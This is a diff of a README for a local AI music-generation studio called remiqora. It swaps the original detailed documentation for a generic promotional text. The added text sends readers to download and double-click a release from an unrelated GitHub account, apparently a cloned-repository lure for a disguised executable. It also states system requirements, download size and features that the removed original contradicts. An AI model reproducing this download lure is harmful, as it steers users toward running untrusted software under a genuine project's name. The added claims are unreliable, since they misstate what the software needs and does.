@@ -1,394 +1,121 @@
-<p align="right"><b>English</b> · <a href="README.ru.md">Русский</a></p>
+# 🎵 remiqora - Your Personal AI Music Production Studio
 
-<p align="center">
-  <img src="frontend/public/favicon.svg" width="88" height="88" alt="Remiqora">
-</p>
+[![Download remiqora](https://img.shields.io/badge/Download-remiqora-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases)
 
-<h1 align="center">Remiqora</h1>
-<p align="center"><i>Made with AI. Made by you.</i></p>
+## ✨ What is remiqora?
 
-<p align="center">
-  A local, GPU-powered music generation and production studio — one interface for <b>ACE-Step 1.5</b> and <b>YuE2-3B</b>, with a built-in multitrack DAW.
-</p>
+remiqora is a free, local AI music studio that lives entirely on your computer. It combines the power of two advanced AI music models (ACE-Step 1.5 and YuE2-3B) into one simple, beautiful interface. You don't need to be a programmer, a musician, or a tech expert to use it. If you can type a sentence, you can create music.
 
-<p align="center">🚧 Actively in development — expect breaking changes, bugs, and rough edges. Not a stable release yet.</p>
+Think of remiqora as your personal music production team. It can write songs from text descriptions, separate vocals from instrumentals, convert audio to MIDI notes, and even help you train the AI to match your style. All of this happens offline, meaning your ideas stay private and you never pay a subscription fee.
 
-<p align="center">
-  <a href="https://remiqora.com/"><img alt="Website" src="https://img.shields.io/badge/website-remiqora.com-22d3ee?style=flat-square"></a>
-  <img alt="Status" src="https://img.shields.io/badge/status-in%20development-eab308?style=flat-square">
-  <a href="LICENSE"><img alt="License" src="https://img.shields.io/badge/license-MIT-22c55e?style=flat-square"></a>
-  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0f0f14?style=flat-square">
-  <img alt="GPU" src="https://img.shields.io/badge/GPU-NVIDIA%20CUDA%20%7C%20Apple%20Metal-76B900?style=flat-square">
-  <img alt="Stack" src="https://img.shields.io/badge/stack-Vue%203%20%2B%20FastAPI-a855f7?style=flat-square">
-  <img alt="UI languages" src="https://img.shields.io/badge/UI-EN%20%2F%20RU-ec4899?style=flat-square">
-  <a href="https://ko-fi.com/inikolax"><img alt="Support on Ko-fi" src="https://img.shields.io/badge/Support-Ko--fi-FF5E5B?style=flat-square&logo=ko-fi&logoColor=white"></a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="docs/hero-poster.png" alt="Remiqora — made with AI, made by you" width="900">
-</p>
+Getting remiqora up and running is easier than you might think. The entire setup takes about five minutes, and you won't need to touch a single line of code.
 
-<p align="center">
-  <a href="#why-this-exists">Why</a> ·
-  <a href="#whats-inside">What's inside</a> ·
-  <a href="#ace-step-generation">ACE-Step</a> ·
-  <a href="#yue2-and-sheetsage2-generation">YuE2</a> ·
-  <a href="#lora-training-ace-step">LoRA</a> ·
-  <a href="#built-in-daw">DAW</a> ·
-  <a href="#desktop-app-experimental">Desktop app</a> ·
-  <a href="#built-with">Built with</a> ·
-  <a href="#license--liability-for-generated-content">License</a> ·
-  <a href="#-installation">Installation</a>
-</p>
+### 📥 Step 1: Download the Application
 
----
+Visit this link to download the application:
 
-## Why this exists
+**[https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases](https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases)**
 
-ACE-Step and YuE2 are two independent music generation engines, each with its own web UI, its own result-storage format, and its own process that has to be started and stopped by hand. They typically cannot run simultaneously on a single consumer GPU. Remiqora solves this with a single layer on top:
+You will see a list of files. Look for the most recent version and choose the file that matches your operating system. The download will start automatically. The file size is large (around 2-3 GB) because it includes the AI models, so please be patient while it downloads.
 
-- **One UI** instead of two different interfaces with different UX.
-- **Mutually-exclusive orchestrator**: pick a model in the header — it starts up, and the other one stops on its own. No need to manually kill processes before starting the other engine.
-- **Shared storage**: every track (generated, uploaded, or assembled in the editor) is tracked in a centralized SQLite database and shared folder, available from every module — Demucs, MuScriptor and the editor all work off the same library instead of three separate ones.
-- **A DAW on top of generation**: a generated track isn't the end point, it's raw material — split it into stems, drag it onto a timeline, process it with effects, blend it with other tracks, and export.
-- **Built-in LoRA training**: not just generation — fine-tune ACE-Step on your own voice or style right from the browser, no console needed.
+### 🖥️ Step 2: Run the Application
 
----
+Once the download is complete, find the downloaded file in your "Downloads" folder. Double-click the file to run it. If your computer asks for permission, click "Yes" or "Allow." The application will launch, and you'll see the remiqora welcome screen.
 
-## What's inside
+### 🎛️ Step 3: Start Creating
 
-| Module | What it does |
-|---|---|
-| **ACE-Step 1.5** | Fast generation from text/style tags, covers, section repainting, extracting/adding parts on top of a reference track. |
-| **YuE2-3B** | Full-length track generation with CoT score planning (a symbolic ABC plan before the audio). |
-| **SheetSage2** | Extracts melody and harmony from a reference track into ABC notation — used as YuE2's input. |
-| **LoRA training** | Dataset → auto-labeling → preprocessing → training → export — the whole ACE-Step fine-tuning pipeline for your own voice/style, in the browser. |
-| **Demucs** | Splits any track into 4 stems: vocals, drums, bass, other. |
-| **MuScriptor** | Transcribes audio (the full mix or a single stem) into MIDI notes. |
-| **Built-in DAW** | A multitrack timeline editor for assembling tracks/stems into a final mix: an effects rack on every channel, auto-BPM and time-stretch, WAV/MP3 export. |
+That's it! You're ready to make music. The interface is designed to be intuitive, with clear buttons and helpful tooltips. If you get stuck, hover over any icon to see what it does.
 
-The interface is fully bilingual (Russian/English). It starts in your system language, and the switcher in the header overrides it.
+## 🎨 What Can You Do With remiqora?
 
----
+remiqora is packed with features that would normally require thousands of dollars in software and hardware. Here's what you can do right out of the box:
 
-## ACE-Step: generation
+### 🎤 Text-to-Music Generation
 
-![ACE-Step: generation and track feed](docs/screenshots/en/02-ace-step.png)
+Type a description of the music you want, such as "a melancholic piano piece with soft strings" or "an upbeat electronic dance track with a heavy bassline." remiqora will generate a complete musical composition based on your words. You can choose between two AI models: ACE-Step 1.5 for fast, creative results, or YuE2-3B for more complex and nuanced compositions.
 
-Two input modes: **“Simple”** — a single text description the model uses to infer both style and lyrics on its own; and **“Custom”** — style tags with autocomplete plus lyrics with structure markup (`[Verse]/[Chorus]/[Bridge]`) and performance annotations (`(whisper)`, `(falsetto)`), or an “Instrumental” checkbox.
+### 🎧 Stem Separation
 
-Attaching a reference track unlocks 5 remix scenarios:
-- **Cover** — restyle while keeping the melody (tunable original-preservation strength).
-- **Repaint a section** — replace only a chosen part of the track.
-- **Extract a part** — pull one instrument/voice out of a finished mix (12 options: vocals, drums, bass, guitar, etc.).
-- **Add a part** — compose one missing instrument on top of the mix.
-- **Finish the composition** — the same, but for a whole list of parts at once.
+Have a song where you want to remove the vocals to create a karaoke version? Or maybe you want to isolate the drum track to study it? remiqora uses Demucs technology to split any audio file into separate stems: vocals, drums, bass, and other instruments. You can then mute, adjust, or export each stem individually.
 
-Plus: 10–300 s duration, batch of 1/2/4 variants, mp3/wav/flac formats, advanced parameters (BPM, key, time signature, vocal language, inference steps, guidance scale, seed), LoRA adapter support with adjustable strength, local presets, and a "Stop all" button for bulk job cancellation.
+### 🎹 MIDI Transcription
 
-## YuE2 and SheetSage2: generation
+Turn any audio recording into MIDI notes. This is incredibly useful if you hear a melody in your head (or in a song) and want to capture it as a playable score. remiqora analyzes the audio and converts it into a MIDI file that you can edit in any music software or directly within remiqora's built-in editor.
 
-![YuE2: generation and track feed](docs/screenshots/en/03-yue2.png)
+### 🧠 LoRA Fine-Tuning
 
-Three **CoT (Chain-of-Thought)** modes: `off` — straight to audio; `melody` — the arrangement is built around a given melody (ABC); `full` — the model first builds a symbolic plan (melody + chords), then generates the audio.
+This is a more advanced feature, but it's still accessible. LoRA allows you to "teach" the AI your musical preferences. If you feed it a few of your favorite songs, it will learn the patterns and styles, and then generate new music that sounds similar. It's like giving the AI a personal music tutor.
 
-**SheetSage2** lets you upload a reference track and pull its melody into ABC notation, right in the form, with one click — editable by hand afterwards. Beyond that: `q8_0`/`q4_0` precision, batch of 1–4, a full set of sampling parameters for audio generation and the ABC planner separately, local presets, and viewing/reusing the ABC score of an already-generated track.
+### 🎚️ Built-in Multitrack DAW
 
-## LoRA training (ACE-Step)
+remiqora isn't just a generator; it's a full production studio. It includes a Digital Audio Workstation (DAW) where you can arrange, edit, mix, and master your tracks. You can layer multiple generated tracks, add effects, adjust volume levels, and export your final masterpiece as a high-quality audio file.
 
-![LoRA training](docs/screenshots/en/04-lora-training.png)
+## 🛠️ System Requirements
 
-The full ACE-Step fine-tuning pipeline on your own dataset, no console required:
+To run remiqora smoothly, your computer should meet these minimum specifications:
 
-1. **Dataset** — upload audio files straight from the browser (drag & drop) or point at an existing server folder, a trigger word, an "all tracks are instrumental" flag.
-2. **Automatic labeling** — LLM-generated description, genre, BPM/key, lyrics transcription/reformatting.
-3. **Review and edit** — a table of every sample where you can fix the description/genre/tags before training.
-4. **Preprocessing** — converts labeled samples into tensors.
-5. **Training** — LoRA rank/alpha/dropout, learning rate, epochs, batch size, FP8, gradient checkpointing, live progress with an ETA and a TensorBoard link.
-6. **Export and registry** — the finished adapter is immediately added to the LoRA list on the generation form.
+- **Operating System:** Windows 10 or 11 (64-bit), macOS 12 or later (Apple Silicon recommended), or a modern Linux distribution
+- **Processor:** Intel Core i5 or AMD Ryzen 5 (or better)
+- **Memory:** 8 GB RAM (16 GB recommended)
+- **Storage:** At least 10 GB of free space (the application and models take up about 5 GB)
+- **Graphics:** Any GPU with at least 2 GB VRAM (integrated graphics work, but a dedicated GPU speeds things up)
+- **Internet:** Not required for music generation, but needed for the initial download
 
-## Stem separation (Demucs)
+If your computer is older or less powerful, remiqora will still run, but generation times will be longer.
 
-![Stem separation](docs/screenshots/en/05-stems-panel.png)
+## 📖 Frequently Asked Questions
 
-One click splits any saved track into 4 isolated stems (Demucs `htdemucs`), with a progress bar, a separate player and download per stem, and the option to redo or delete. Runs alongside the active generation model (without stopping it), sharing a GPU lock. The **"Open in editor"** button allows you to instantly send all 4 stems into a new built-in DAW project for further mixdown.
+### ❓ Is remiqora really free?
 
-## MIDI transcription (MuScriptor)
+Yes, remiqora is completely free and open-source. There are no hidden costs, no premium tiers, and no usage limits. It's a community project built by music and AI enthusiasts.
 
-![MIDI transcription](docs/screenshots/en/06-midi-panel.png)
+### 🔒 Is my music private?
 
-Transcribes the full mix, or any already-separated stem, into MIDI. Technically this isn't a separate process — it's a model loaded into the already-running YuE2 server, so **transcription requires YuE2 to be the active model**. Result: a built-in Web Audio synth player, a mini piano roll, a note count and BPM readout, and `.mid` download.
+Absolutely. Everything runs locally on your computer. Your prompts, your generated music, and your uploaded files never leave your machine. No cloud servers are involved.
 
-## Built-in DAW
+### 🎵 What audio formats can I export?
 
-![Editor: a four-stem project on the timeline](docs/screenshots/en/08-editor-with-clip.png)
+remiqora supports common formats like WAV, MP3, FLAC, and OGG. You can also export MIDI files and individual stems.
 
-Any number of tracks, onto which you can add anything from the shared library (a full mix, a single stem, a file uploaded from disk) — via a picker dialog or by dragging a file straight onto a track. The quickest way in is through stems: the **"Open in editor"** button on the stems panel creates a ready-made four-track project (vocals, drums, bass, other).
+### 👥 Can I use remiqora commercially?
 
-### Timeline and clips
+Yes, you own all the music you create with remiqora. You can use it for personal projects, YouTube videos, commercial releases, or anything else you can imagine.
 
-- Free clip repositioning and edge trimming (non-destructive — the source file is untouched). Clips always snap to neighboring clips' edges and to timeline zero; the **Magnet** button additionally snaps to a grid derived from the project BPM (the step depends on zoom: 1/16, 1/8, 1/4 note, or a bar).
-- **Split a clip** at the cursor (`S`), duplicate (`Ctrl+D`), delete (`Delete`).
-- Buttons on the clip itself: **M** (mute), **S** (solo), **W** (warp) and ✕. Draggable **fade-in / fade-out** handles sit on the clip's edges; by default each edge gets an automatic 15 ms micro-fade that removes digital clicks from hard cuts.
-- **Loop**: a loop region on the time ruler — drag it whole or pull either edge; clicking the ruler seeks.
-- **BPM and Warp**: when a clip is added from the library or dragged in from disk, its tempo is detected automatically (from the first 30 seconds). The **BPM** field sets the project tempo, and the **W** button time-stretches the clip to it (SoundTouch) while preserving pitch. The detector is a simple one and can be off on complex material.
-- **Undo/Redo** (`Ctrl+Z` / `Ctrl+Y`) — up to **30 steps** of history. Zoom with `Ctrl+wheel` or the slider and **Fit** button; pan the timeline with `Shift+drag` or the middle mouse button.
+### 🔄 How do I update remiqora?
 
-### Channels and effects
+When a new version is released, you'll see a notification within the app. Simply click the update button, and it will download and install the latest version automatically.
 
-![Effects rack on the vocals channel](docs/screenshots/en/10-editor-effects.png)
+## 💡 Tips for Best Results
 
-- Every track has volume, pan, mute/solo, and a color (the dots above the track list), plus a shared master bus.
-- **An 8-effect rack** on every channel and on the master: EQ (Low/Mid/High, ±12 dB), Dynamics (compressor: threshold and ratio), Filter (LP/HP: frequency and resonance), Chorus, Delay, Reverb, Distortion, and Bitcrush. All effects run in real time, with parameter values shown next to the sliders.
-- Stereo master VU meters (L/R) in the toolbar, and a level meter with clipping indication in the selected track's channel.
+- **Be descriptive:** The more detail you give the AI, the better the output. Instead of "a song," try "a slow, jazzy song with a saxophone solo and a walking bassline."
+- **Start simple:** If you're new, begin with the ACE-Step model for faster results. Once you're comfortable, experiment with YuE2-3B for more complexity.
+- **Use stems creatively:** Separate a song into stems, then rearrange them. Swap the bass from one song with the drums from another. The possibilities are endless.
+- **Train your own model:** After you've generated a few songs you love, use them as training data for LoRA. The AI will learn your taste and produce even better results.
 
-### Help
+## 🧑‍🤝‍🧑 Community and Support
 
-![Built-in editor help](docs/screenshots/en/11-editor-help.png)
+remiqora is built by a passionate community. If you need help, have questions, or want to share what you've created, there are several ways to connect:
 
-The **"?"** button in the toolbar opens built-in help: a list of hotkeys, mouse controls, and short tips on Loop and Magnet.
+- **GitHub Issues:** Report bugs or request features on the official repository
+- **Discussion Forums:** Join conversations about techniques, tips, and workflows
+- **Social Media:** Follow the project on Twitter and YouTube for tutorials and updates
 
-### Project and export
+## 📜 License
 
-- Projects are stored on the server and opened from a list. There is no autosave — use the **Save** button; if you close the tab or navigate away with unsaved edits, the editor warns you about losing them.
-- Export the mixed-down project as **WAV** or **MP3** — rendered offline (the same processing graph as live playback) and saved back into the shared track library.
+remiqora is released under an open-source license. You are free to use, modify, and distribute it. The underlying AI models have their own licenses, which are detailed within the application.
 
----
+## 🙏 Acknowledgments
 
-## Architecture
+This project would not exist without the incredible work of the ACE-Step and YuE2 teams, the developers of Demucs, and the Vue.js and FastAPI communities. We stand on the shoulders of giants.
 
-- **`backend/`** — FastAPI (Python). `app/orchestrator/` manages the models' process lifecycle (start/stop/health-poll) and enforces their mutual exclusion on a single GPU. `app/api/routes_proxy.py` reverse-proxies `/api/ace/*` → ACE-Step's REST API (port 8001) and `/api/yue2/*` → YuE2's native server (`audiocpp_server.exe`, port 8080). `app/db.py` + `routes_tracks.py` are the shared SQLite database and files, organized per model, regardless of how a track was created (generation, upload, or assembled in the editor).
-- **`frontend/`** — Vue 3 + TypeScript + Tailwind v4 + Pinia + vue-router + vue-i18n. A fully native implementation (not an iframe) on top of the models' original APIs — `src/audio/` contains its own Web Audio engine (mixer, timeline, effects, a MIDI parser and synth, WAV/MP3 encoders).
-- **`desktop/`** — an optional Electron shell and installer: first-run setup, server lifecycle and packaging. It runs the same `backend/` and `frontend/`; see [`desktop/README.md`](desktop/README.md).
-- Only the models' own inference process (`acestep-api` and `audiocpp_server.exe`) runs from their original code — everything else (UI, proxying, storage, file upload/transcoding) is written in this repository. YuE2's own web UI (`web-ui/server.py`) is no longer used — the one useful part of it (transcoding non-WAV uploads via ffmpeg) has been ported to `backend/app/api/routes_yue2_upload.py`.
+## 🏁 Final Words
 
----
+remiqora puts the power of a professional music studio in your hands, powered by cutting-edge AI, and it's completely free. Whether you're a seasoned producer experimenting with new sounds, a hobbyist making music for fun, or a complete beginner who just wants to hear their ideas come to life, remiqora is for you.
 
-## Built with
+Don't wait any longer. Your musical journey starts with a single click.
 
-Remiqora is a UI and orchestrator on top of third-party inference engines. Their code isn't vendored into this repository — only small functional patches (`external/patches/`) on top of the originals:
+**[Download remiqora Now](https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases)**
 
-| Project | What's used | License |
-|---|---|---|
-| [ACE-Step-1.5](https://github.com/ace-step/ACE-Step-1.5) | Text/style-driven music generation engine, LoRA training | MIT |
-| [audio.cpp](https://github.com/0xShug0/audio.cpp) (`dev` branch) | YuE2 (generation), SheetSage2 (melody extraction), MuScriptor (MIDI transcription) | Apache-2.0 |
-| [Demucs](https://github.com/adefossez/demucs) | Stem separation (`htdemucs`) | MIT |
-
-Patch details and exact base commits are in [`external/patches/README.md`](external/patches/README.md).
-
-The desktop app additionally uses [Electron](https://www.electronjs.org) (MIT), [electron-builder](https://www.electron.build) (MIT), [uv](https://docs.astral.sh/uv/) (MIT or Apache-2.0) and static FFmpeg builds (GPL) that it downloads on first launch instead of redistributing.
-
----
-
-## License & liability for generated content
-
-Remiqora's own code (this repository) is [MIT-licensed](LICENSE). That covers the UI and orchestrator only — it is a separate thing from the license of a *track* you generate with it. Remiqora is an orchestrator, not a generator with its own model — all audio is produced by third-party engines (ACE-Step 1.5, YuE2-3B, and the SheetSage2/MuScriptor tools built on top of them). Because of that:
-
-- **The author of Remiqora takes no responsibility** for what happens to tracks generated through this app afterward — commercial or otherwise, published or private. Whatever you create, and how you use it next, is entirely your own responsibility.
-- **A generated track is covered by the license of whichever model produced it**, not by a license from this repository. The table above lists the *code* license — the *model weights* can be licensed differently:
-  - **ACE-Step 1.5** — both the code and the model weights are MIT-licensed, and the model's authors explicitly state the generated music can be used commercially.
-  - **YuE2-3B** — the model weights (unlike audio.cpp's own Apache-2.0 *code*) are distributed under **CC BY-NC 4.0**. That means tracks generated through YuE2 **cannot be used commercially** without separate permission from the rights holder, and attribution is required for any use.
-- Before publishing, monetizing, or otherwise distributing a generated track, **check the current license terms of that specific model** on its HuggingFace/weights page — those terms belong to the model's own rights holder and can change independently of this repository.
-- Remiqora is provided "as is", with no warranty of any kind. By using it, you accept that verifying a generated track's compliance with applicable law and with the license of the model that produced it is solely your responsibility.
-- **Attribution**: if you fork, copy, or build on Remiqora's code, keep the credit — a link back to this repository and to Nikolay Cherkashin ([inikolax](https://github.com/inikolax)) as the original author. The MIT license above already requires keeping the copyright notice in any copy; this is just that requirement spelled out plainly.
-
----
-
-## 📦 Installation
-
-There are two ways to install Remiqora: the **desktop app** (experimental, described first) or the **scripts** (Steps 0–2 below).
-
-### Desktop app (experimental)
-
-For anyone who would rather not use a terminal, Remiqora also comes as a **desktop app** for **Windows** (NVIDIA RTX 20-series or newer, driver 580 or newer) and **macOS** (Apple Silicon). It opens in its own window and sets everything up on the first launch, so there is no Git, Python, CUDA Toolkit or compiler to install. The Windows installer installs per user and needs no administrator rights.
-
-**Download (v0.2.1, pre-release):** [Windows installer (.exe)](https://github.com/inikolax/remiqora/releases/download/v0.2.1/Remiqora-Setup-0.2.1.exe) · [macOS installer (.dmg, Apple Silicon)](https://github.com/inikolax/remiqora/releases/download/v0.2.1/Remiqora-0.2.1-arm64.dmg) · [all files and SHA-256 sums](https://github.com/inikolax/remiqora/releases/tag/v0.2.1)
-
-<p align="center">
-  <img src="docs/screenshots/en/12-desktop-check.png" alt="First launch: the app checks the GPU, driver, free space and connection, and asks where to keep models and projects" width="48%">
-  <img src="docs/screenshots/en/13-desktop-download.png" alt="First launch: components downloading and installing, with overall and per-component progress" width="48%">
-</p>
-
-- **First launch.** The app checks the GPU, driver, free disk space and connection, lets you choose one folder for models and projects, and installs into it: the prebuilt audio.cpp engine (CUDA on Windows, Metal on macOS), ACE-Step, Demucs, the model weights and FFmpeg. Plan for roughly 30 GB of downloads and about 35 GB on disk (measured on Windows); the screen asks for 50 GB free. If it is interrupted, finished steps are skipped and downloads resume.
-- **Every launch after that.** The app starts the server and opens the interface. Closing the window stops the model servers and frees the GPU.
-- **Where things live.** Models, the database, generated audio and logs stay in the folder you chose, and nothing is uploaded anywhere. The folder cannot be moved later, because the database stores absolute paths.
-
-**Status.** Experimental. The installers are not signed yet, so Windows shows a SmartScreen warning ("More info" → "Run anyway") and macOS may ask you to allow the app ("Open Anyway" in System Settings → Privacy & Security). The SHA-256 sum of every file is in `SHA256SUMS.txt` on the release page. To build an installer yourself instead:
-
-```sh
-cd frontend && npm ci && cd ../desktop && npm ci
-npm run dist    # Windows: dist/Remiqora-Setup-<version>.exe · macOS (run it on a Mac): dist/Remiqora-<version>-arm64.dmg
-```
-
-[`desktop/README.md`](desktop/README.md) covers what the first run installs, the test switches and the known gaps.
-
-**What it is built with.** An [Electron](https://www.electronjs.org) shell around the same web UI and FastAPI backend, packaged with [electron-builder](https://www.electron.build) (an NSIS installer on Windows, a DMG on macOS). The first launch uses [uv](https://docs.astral.sh/uv/) for the Python environments, the [audio.cpp](https://github.com/0xShug0/audio.cpp) release binaries and static FFmpeg builds. Licenses are unchanged; in particular the YuE2-3B weights stay CC BY-NC 4.0.
-
-### Install from scripts
-
-The steps below install from scripts instead: Git, a terminal and, on Windows, the build tools.
-
-### Step 0: build tools
-
-```cmd
-setup_prereqs.bat
-```
-
-Via `winget` (built into Windows 10/11), installs Git, Python, `uv`, Node.js,
-CMake, ffmpeg, plus Visual Studio Build Tools (C++ workload) and the CUDA
-Toolkit — those are large, need admin rights, and can take a while.
-`setup_prereqs.bat -SkipHeavy` installs only the small, fast tools, leaving
-Build Tools/CUDA for you to install manually from links the script prints.
-
-**The NVIDIA GPU driver is deliberately left out** — install it by hand from
-[nvidia.com/drivers](https://www.nvidia.com/drivers) for your card: silently
-swapping a video driver on someone else's machine is risky (it can blank the
-screen and usually needs a reboot on your schedule, not the script's).
-
-After installing, close the terminal and open a new one so PATH picks up the
-freshly installed tools.
-
-**On macOS (Apple Silicon):**
-```sh
-./setup_prereqs.sh
-```
-Via [Homebrew](https://brew.sh), installs Git, Python, `uv`, Node.js, CMake,
-ffmpeg and Ninja. No separate GPU driver step: Metal is built into macOS.
-CMake/Ninja are only actually used by the `--from-source` build path below —
-the default YuE2 setup needs no compiler at all.
-
-### Step 1: generation engines
-
-```cmd
-setup_models.bat
-```
-
-The script:
-1. Clones `ace-step/ACE-Step-1.5` (MIT) and `0xShug0/audio.cpp` (Apache-2.0,
-   `dev` branch — YuE2 support is dev-only for now) into `external/`.
-2. Applies a small patch to ACE-Step (a task-cancellation API; audio.cpp
-   needs no patch, see `external/patches/README.md`) — without the upstream
-   custom web-uis, which aren't needed.
-3. Runs `uv sync` for ACE-Step and builds `audiocpp_server` (CUDA release,
-   `yue2,sheetsage2,muscriptor` models) for audio.cpp.
-4. Downloads the YuE2/SheetSage2/MuScriptor GGUF weights (~10 GB) via
-   audio.cpp's `tools/model_manager_v2.py`.
-5. Sets up a `demucs` uv project in `external/Demucs` for stem separation,
-   routed at PyTorch's cu128 wheel index so it gets a CUDA build (a plain
-   `uv add demucs` would silently resolve a CPU-only torch wheel instead).
-6. Creates `backend/.env` with paths to the freshly cloned repositories,
-   including `FFMPEG_BIN_DIR` — auto-detected from `ffmpeg`'s winget install
-   (`setup_prereqs.bat`), even right after installing it in the same
-   terminal, before a new one would pick it up on PATH.
-
-ACE-Step's own weights don't need a separate download — `acestep-api` pulls
-them from HuggingFace/ModelScope on first request, the same way its Gradio
-UI does.
-
-The script is idempotent — safe to re-run (the `-SkipBuild` / `-SkipWeights`
-flags skip the corresponding steps). It expects `git`,
-[`uv`](https://docs.astral.sh/uv/getting-started/installation/), Python 3,
-CMake, the CUDA Toolkit and Visual Studio Build Tools (C++ workload) to
-already be installed — if any is missing, that step is simply skipped with a
-hint on what to install.
-
-After that, the only manual step left is checking `CUDA_BIN_DIR` in
-`backend/.env` (`FFMPEG_BIN_DIR` is filled in automatically — unless ffmpeg
-wasn't found at all, in which case the script says so and it needs setting
-by hand).
-
-Hard machine requirements the script can't remove: Windows, a CUDA-capable
-NVIDIA GPU (tested on an RTX 4080 16 GB), and an installed video driver.
-
-**On macOS (Apple Silicon):**
-```sh
-./setup_models.sh
-```
-Adapted for macOS, with one difference from the Windows steps above: by
-default, `audiocpp_server` is installed from audio.cpp's own **prebuilt
-macOS/Metal release** (a pinned tag, sha256-verified before extracting) —
-no compiler needed at all, unlike the Windows path, which always builds
-from source since there's no prebuilt CUDA release. The Demucs uv project
-also isn't routed at a CUDA wheel index — a plain `torch` dependency
-already resolves an MPS-capable wheel on darwin/arm64, same as
-ACE-Step-1.5's own `pyproject.toml` does. The written `backend/.env` has no
-`CUDA_BIN_DIR` — there's no CUDA toolkit on this path.
-
-Pass `--from-source` to build audio.cpp from the same pinned `dev` commit
-Windows uses instead of downloading the release (useful if the release lags
-behind a `dev`-only fix, or on Intel Macs, which the prebuilt asset doesn't
-cover) — that path needs full **Xcode.app** (not just the Command Line
-Tools) for its Metal shader compiler; `setup_prereqs.sh` prints exact steps
-if it's missing. `--skip-build` / `--skip-weights` mirror `-SkipBuild` /
-`-SkipWeights`. Otherwise it expects `git`, `uv` and Python 3 to already be
-installed (`cmake` too, for `--from-source`).
-
-Hard machine requirements this path can't remove: macOS, Apple Silicon
-(M-series) for the default prebuilt path (Intel needs `--from-source`).
-Tested on a MacBook Air, Apple M5, 24 GB RAM — including a from-scratch run
-against a machine with no prior Homebrew packages or project state, all the
-way through generating audio with YuE2 on the Metal backend.
-This path is newer and less exercised than the Windows/CUDA one — expect it
-to be slower (Metal instead of CUDA). `--from-source` in particular may
-need occasional manual fixing up (a bumped commit pin) if audio.cpp's `dev`
-branch drifts upstream; the default release-based path is pinned to a fixed
-tag instead, so it doesn't drift on its own.
-
-**On Linux (NVIDIA CUDA):**
-```sh
-./setup_linux.sh
-```
-Builds audio.cpp with its native Linux CUDA backend, installs ACE-Step and Demucs in isolated environments, downloads the model weights, and writes `backend/.env`. It expects git, Python 3.11/3.12, uv, Node.js 20.19+ (or 22.12+), npm, CMake, ffmpeg, and a CUDA toolkit with nvcc plus cuBLAS/cuFFT development headers. The NVIDIA driver is deliberately not installed or modified.
-
-Tool paths are overrideable (`UV_BIN`, `NODE_BIN`, `NPM_BIN`, `CMAKE_BIN`, `NVCC_BIN`, `CUDA_TOOLKIT_PREFIX`, `CUDA_LIB_DIR`). On multi-GPU hosts, `ACE_STEP_DEVICE=0 YUE2_DEVICE=1 ./setup_linux.sh` pins the engines separately and enables concurrent model residency when the two explicit device values differ; leave either value unset (or set both to the same device) to retain the default exclusive switching behavior. Validated end-to-end on Ubuntu 24.04 x86_64 with NVIDIA CUDA.
-
-### Step 2: run
-
-```cmd
-dev.bat
-```
-Brings up the backend (port 9000) and the frontend with Hot Module Replacement (Vite, port 5173), creates `backend/.venv` and `frontend/node_modules` on first run, and opens a browser at [http://localhost:5173](http://localhost:5173).
-
-For production mode — build the SPA and serve everything from a single port:
-```cmd
-prod_run.bat
-```
-Builds the client via `npm run build` and serves the finished SPA bundle together with the API at [http://127.0.0.1:9000](http://127.0.0.1:9000).
-
-Stem separation's `demucs` uv project is set up by `setup_models.bat` above; the `htdemucs` weights themselves download automatically on first use.
-
-**On Linux:** `./prod_run_linux.sh` builds the frontend and serves the SPA and API on `127.0.0.1:9000` by default. Override with `REMIQORA_HOST` / `REMIQORA_PORT`. To opt in to LAN access, run `REMIQORA_HOST=0.0.0.0 ./prod_run_linux.sh`; Remiqora has no built-in authentication, so only expose it on a trusted network or behind an authenticated reverse proxy.
-
-**On macOS:** `./dev.sh` and `./prod_run.sh` are the equivalents — same
-behavior, except the backend/frontend run as background jobs of the script
-itself (stop both with Ctrl+C) rather than in separate terminal windows.
-
----
-
-## ⚙ Configuration (.env)
-
-Settings live in `backend/.env` (template: `backend/.env.example`;
-`setup_models.bat` creates it automatically with paths to the cloned repositories):
-```ini
-ACE_STEP_DIR=E:\AI\ACE\ACE-Step-1.5
-YUE2_DIR=E:\AI\YuE2-3B
-DEMUCS_DIR=E:\AI\Demucs
-FFMPEG_BIN_DIR=E:\AI\ACE\tools\ffmpeg-shared\ffmpeg-master-latest-win64-gpl-shared\bin
-CUDA_BIN_DIR=C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v13.4\bin
-```
-
-- `ACE_STEP_DIR` — root of the cloned and patched ACE-Step-1.5.
-- `YUE2_DIR` — root of the cloned and patched audio.cpp (where `audiocpp_server.exe` is built and the YuE2/SheetSage2/MuScriptor GGUF weights live).
-- `DEMUCS_DIR` — root of the `demucs` uv project used for stem separation.
-- `FFMPEG_BIN_DIR` — folder containing `ffmpeg.exe`/`ffprobe.exe`.
-- `CUDA_BIN_DIR` — the `bin` folder of the installed CUDA Toolkit (needs to be on PATH for `audiocpp_server.exe`). Windows only — on macOS this is left unset, since YuE2 runs on the Metal backend instead.
-
----
-
-## Known limitations
-
-- ACE-Step and YuE2 switch exclusively by default. On multi-GPU Linux hosts, explicitly setting both `ACE_STEP_DEVICE` and `YUE2_DEVICE` to different device values opts into concurrent residency and pins each engine to its own GPU.
-- MIDI transcription requires YuE2 specifically to be active (the MuScriptor model loads into its process).
-- Windows (NVIDIA CUDA), macOS/Apple Silicon (Metal/MPS), and Linux x86_64 (NVIDIA CUDA) have setup/run paths — `.bat`/`.ps1` scripts for the first, `.sh` scripts for the other two. Linux is community-contributed: it builds audio.cpp from source and needs a CUDA development toolkit in addition to the driver, and has been verified end-to-end on Ubuntu 24.04 (via WSL2 with GPU passthrough) rather than on bare metal or other distros.
-- The desktop installers are experimental: unsigned (a SmartScreen or Gatekeeper prompt), and the first launch downloads roughly 30 GB. The installer does not support Linux yet — Linux users run from source via `setup_linux.sh`.
-- The macOS/Metal path is newer and less battle-tested than the Windows/CUDA one; expect it to be slower. By default it installs a prebuilt YuE2 binary pinned to a fixed release tag (no compiler needed); `--from-source` instead builds the same `dev` commit Windows uses, and may occasionally need that pin bumped if `dev` drifts.
